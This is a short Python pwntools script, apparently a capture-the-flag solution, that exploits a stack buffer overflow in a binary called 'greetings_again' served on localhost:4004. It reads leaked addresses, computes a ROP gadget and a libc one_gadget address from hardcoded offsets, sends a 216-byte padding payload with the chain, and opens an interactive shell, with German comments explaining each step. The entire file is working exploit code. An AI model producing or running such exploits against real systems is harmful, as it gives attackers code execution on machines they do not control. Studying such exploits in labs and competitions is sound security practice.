#!/usr/bin/env_python
from pwn import *
from requests import *
import sys
import os
from binascii import hexlify

context.arch = 'amd64'


def get_addresses():
    # lib = ELF("./libc.so.6")
    #e = ELF("./greetings_again")
    HOST = "localhost"
    PORT = 4004
    p = remote(HOST, PORT)
    # p = process("./greetings_again")

    output = p.recvuntil("werden?\n")
    output = str(output).split(":")

    addresses = (output[2].split("\\n")[0], output[3].split(
        "\\n")[0], output[4].split("\\n")[0])
    print(addresses)

    address_greetings = addresses[2]
    address_greetings = int(address_greetings, 0)

    # ROPchain: 0x00000000000012b4 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    # rop1 wird zum vorbereiten des stack für die system() funktion genutzt
    # rop1 = address_greegins - offset address greetings (objdump) + ROP chain (ROPgadget)
    rop1 = address_greetings - 0x00000000000011e2 + 0x00000000000012b4
    print("rop1 0x%x" % rop1)
    address_printf = addresses[1]
    address_printf = int(address_printf, 0)

    # rop2 wird zum ausführen der system() payload genutzt
    # rop2 = address_printf - printf(OFFSET) + gadget (one_gadget)
    rop2 = address_printf - 0x0000000000053cf0 + 0xc961a
    print("rop2 0x%x" % rop2)

    payload = [
        b"A"*216,
        p64(rop1),
        p64(0x0),
        p64(0x0),
        p64(0x0),
        p64(0x0),
        p64(rop2)
    ]

    log.info("Joining payload...")
    payload = b"".join(payload)

    # print(payload)
    # gdb.attach(p)

    log.info("Sending payload...")
    p.sendline(payload)

    log.info("Changing to interactive mode..")
    p.interactive()


if __name__ == "__main__":
    get_addresses()
